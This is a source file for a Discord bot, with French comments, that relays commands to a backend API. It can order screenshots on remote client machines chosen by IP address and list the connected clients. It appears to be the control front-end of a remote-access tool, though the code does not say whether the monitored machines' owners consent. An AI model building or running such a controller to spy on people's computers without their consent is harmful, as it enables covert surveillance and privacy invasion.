import {Client, EmbedBuilder, GatewayIntentBits} from 'discord.js';
import config from './config.json' assert {type: 'json'};
import axios from "axios";
import {commands} from './commands.js';

const { TOKEN, API_BASE_URL } = config;
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setActivity('/help');
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    switch (interaction.commandName) {
        case 'help':
            await interaction.deferReply({ ephemeral: true });
            const embed = new EmbedBuilder()
                .setTitle('Help')
                .setDescription('Here are the available commands:')
                .addFields(
                    commands.map(command => ({
                        name: `/${command.name}`,
                        value: command.description,
                    }))
                )
                .setTimestamp()
            await interaction.editReply({ embeds: [embed] });
            break;

        case 'screenshot':
            const ip = interaction.options.getString('ip');
            await interaction.deferReply({ ephemeral: true });
            axios.post(`${API_BASE_URL}/command`, {
                command: 'screenshot',
                ip: ip
            })
                .then(response => {
                    interaction.editReply(`Command sent to take a screenshot on ${ip}.`);
                })
                .catch(error => {
                    console.error("Erreur lors de l'envoi de la commande", error);
                    interaction.editReply("Erreur lors de l'envoi de la commande.");
                });
            break;

        case 'clients':
            await interaction.deferReply({ ephemeral: true });
            axios.get(`${API_BASE_URL}/clients`)
                .then(response => {
                    const clients = response.data.clients;
                    const embed = new EmbedBuilder()
                        .setTitle('Clients')
                        .setDescription('Here are the available clients:')
                        .addFields(
                            clients.map(client => ({
                                name: client.name || 'Unnamed client', // Utilisez une valeur par défaut si 'name' est undefined
                                value: client.ip,
                            }))
                        )
                        .setTimestamp()
                    interaction.editReply({embeds: [embed]});
                })
                .catch(error => {
                    console.error("Erreur lors de la récupération des clients", error);
                    interaction.editReply("Erreur lors de la récupération des clients.");
                });
            break;

        case 'stop':
            await interaction.deferReply({ ephemeral: true });
            await interaction.editReply('Stopping the bot...');
            process.exit(0);
            break;

        default:
            break;
    }
});

client.login(TOKEN);